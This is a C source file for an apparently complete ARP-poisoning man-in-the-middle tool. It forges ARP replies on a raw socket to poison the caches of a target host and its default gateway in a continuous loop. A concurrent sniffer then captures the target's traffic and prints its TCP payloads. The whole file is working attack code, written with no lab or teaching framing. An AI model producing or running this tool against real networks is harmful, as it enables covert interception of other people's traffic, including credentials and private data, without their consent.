#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/if_ether.h> 
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>  
#include <pthread.h>
#include "arp_poisoner.h"
#include "utils.h"

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define RESET   "\033[0m"


void send_arp_reply(int sockdf, int ifindex, unsigned char* attacker_mac, unsigned char* target_mac, char* target_ip, char* spoofed_ip) {
    
    unsigned char buffer[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    memset(buffer, 0, sizeof(buffer));

    struct ether_header* eth_hdr = (struct ether_header*) buffer;
    struct ether_arp* arp_hdr = (struct ether_arp*) (buffer + sizeof(struct ether_header));

    memcpy(eth_hdr->ether_dhost, target_mac, 6);
    memcpy(eth_hdr->ether_shost, attacker_mac, 6);
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    arp_hdr->arp_hln = 6;
    arp_hdr->arp_pln = 4;
    arp_hdr->arp_op = htons(ARPOP_REPLY);
    
    memcpy(arp_hdr->arp_sha, attacker_mac, 6); // Attacker's MAC address
    inet_pton(AF_INET, spoofed_ip, arp_hdr->arp_spa); // Spoofed IP address 

    memcpy(arp_hdr->arp_tha, target_mac, 6); // Target's MAC address
    inet_pton(AF_INET, target_ip, arp_hdr->arp_tpa); // Target's IP address


    // define the sockaddr_ll structure for sending the packet
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, target_mac, 6);

    // send the ARP reply
    if (sendto(sockdf, buffer, sizeof(buffer), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror(RED "[!] sendto failed" RESET);
    }
}


void start_arp_spoofing(char* iface, char* target_ip, char* target_mac_str, char* router_ip, char* router_mac_str) {
    unsigned char target_mac[6];
    unsigned char router_mac[6];
    parse_mac(target_mac_str, target_mac);
    parse_mac(router_mac_str, router_mac);

    int sockdf = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockdf < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(sockdf, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sockdf);
        exit(EXIT_FAILURE);
    }
    int ifindex = ifr.ifr_ifindex;

    if (ioctl(sockdf, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl hwaddr");
        close(sockdf);
        exit(EXIT_FAILURE);
    }

    
    unsigned char attacker_mac[6];
    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6); // Use interface's MAC as attacker's MAC for spoofing

    printf(YELLOW "[*] Commencing MitM Attack on %s <--> %s\n" RESET, target_ip, router_ip);
    printf("[*] Press Ctrl+C to stop...\n");

    while (1) {
        send_arp_reply(sockdf, ifindex, attacker_mac, target_mac, target_ip, router_ip); // Poison target's ARP cache
        send_arp_reply(sockdf, ifindex, attacker_mac, router_mac, router_ip, target_ip); // Poison router's ARP cache
        sleep(2); // Wait before sending the next round of ARP replies
    }
    
}

void* spoofing_thread(void* args) {
    char** params = (char**)args;
    start_arp_spoofing(params[0], params[1], params[2], params[3], params[4]);
    return NULL;
}

int get_mac_from_ip(const char *ip, char *mac_buffer)
{
    FILE *fp;
    char line[256];

    fp = fopen("/proc/net/arp", "r");
    if (!fp)
        return -1;

    fgets(line, sizeof(line), fp);

    while (fgets(line, sizeof(line), fp)) {
        char ip_addr[64], hw_type[8], flags[8], mac[32], mask[32], device[32];

        sscanf(line, "%63s %7s %7s %31s %31s %31s",
               ip_addr, hw_type, flags, mac, mask, device);

        if (strcmp(ip_addr, ip) == 0) {
            strcpy(mac_buffer, mac);
            fclose(fp);
            return 0;
        }
    }

    fclose(fp);
    return -1;
}

int get_default_gateway(char *gateway_ip)
{
    FILE *fp;
    char line[256];

    fp = fopen("/proc/net/route", "r");
    if (!fp) {
        perror("fopen");
        return -1;
    }

    fgets(line, sizeof(line), fp);

    while (fgets(line, sizeof(line), fp)) {
        char iface[32];
        unsigned long dest, gateway;

        if (sscanf(line, "%31s %lx %lx", iface, &dest, &gateway) != 3)
            continue;

        if (dest == 0) {  // 0.0.0.0 = default route
            struct in_addr addr;
            addr.s_addr = gateway;
            strcpy(gateway_ip, inet_ntoa(addr));
            fclose(fp);
            return 0;
        }
    }

    fclose(fp);
    return -1;
}

int start_packet_sniffer(char* target_ip) {
    int sockdf;
    char buffer[65536];
    struct sockaddr saddr;
    socklen_t saddr_len = sizeof(saddr);

    sockdf = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockdf < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    while(1) {
        int bytes_received = recvfrom(sockdf, buffer, sizeof(buffer), 0, &saddr, &saddr_len);
        if (bytes_received < 0) {
            perror("recvfrom");
            close(sockdf);
            exit(EXIT_FAILURE);
        }

        struct ether_header* eth_hdr = (struct ether_header*) buffer;
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
            struct iphdr* ip_hdr = (struct iphdr*) (buffer + sizeof(struct ether_header));
            
            char src_ip[INET_ADDRSTRLEN];
            char dst_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip_hdr->saddr, src_ip, sizeof(src_ip));
            inet_ntop(AF_INET, &ip_hdr->daddr, dst_ip, sizeof(dst_ip));

            if (strcmp(src_ip, target_ip) == 0 || strcmp(dst_ip, target_ip) == 0) {
                printf(GREEN "Captured packet: %s -> %s\n" RESET, src_ip, dst_ip);

                if (ip_hdr->protocol == IPPROTO_TCP) {
                    int ip_header_len = ip_hdr->ihl * 4;
                    struct tcphdr* tcp_hdr = (struct tcphdr*) (buffer + sizeof(struct ether_header) + ip_header_len);
                    int tcp_header_len = tcp_hdr->doff * 4;
                    int payload_size = bytes_received - sizeof(struct ether_header) - ip_header_len - tcp_header_len;

                    if (payload_size > 0) {
                        char* payload = buffer + sizeof(struct ether_header) + ip_header_len + tcp_header_len;
                        printf("Payload (%d bytes):\n", payload_size);
                        for (int i = 0; i < payload_size; i++) {
                            // Print printable characters, replace non-printable with dots
                            if ((payload[i] >= 32 && payload[i] <= 126) || payload[i] == '\n' || payload[i] == '\r') {
                                printf("%c", payload[i]);
                            } else {
                                printf(".");
                            }
                        }
                        printf("\n\n");
                    }
                    
                }
                
            }
        } 

    }
    close(sockdf);
    return 0;
}



int start_arp_poisoner(char* iface, char* target_ip) {
    pthread_t spoof_thread;
    char target_mac_str[18];
    char router_mac_str[18];
    char router_ip[INET_ADDRSTRLEN];
    if (get_default_gateway(router_ip) < 0) {
        fprintf(stderr, "Failed to get default gateway IP\n");
        return -1;
    }
    if (get_mac_from_ip(target_ip, target_mac_str) < 0) {
        fprintf(stderr, "Failed to get MAC address for target IP %s (try ping it first)\n", target_ip);
        return -1;
    }
    if (get_mac_from_ip(router_ip, router_mac_str) < 0) {
        fprintf(stderr, "Failed to get MAC address for router IP %s (try ping it first)\n", router_ip);
        return -1;
    }
    char* params[] = {iface, target_ip, target_mac_str, router_ip, router_mac_str};
    if (pthread_create(&spoof_thread, NULL, spoofing_thread, params) != 0) {
        perror("pthread_create");
        return -1;
    }

    start_packet_sniffer(target_ip);
    pthread_join(spoof_thread, NULL);
    return 0;
}

